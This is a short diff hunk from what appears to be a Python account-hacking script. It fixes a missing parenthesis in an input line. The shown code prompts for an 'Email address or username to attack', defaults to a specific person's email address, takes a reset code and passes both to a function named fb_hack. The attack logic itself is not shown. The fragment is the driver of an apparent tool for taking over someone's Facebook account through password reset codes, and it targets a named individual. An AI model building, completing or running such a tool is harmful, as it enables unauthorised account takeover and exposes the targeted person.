@@ -88,5 +88,5 @@ passcode6()
 
 ehack = input('Email address or username to attack:') or str("amschwab@comcast.net")
 reset = int(input('Code: ') or 99999999)
-sear = str(input('Search:')
+sear = str(input('Search:'))
 fb_hack(ehack, reset, sear)
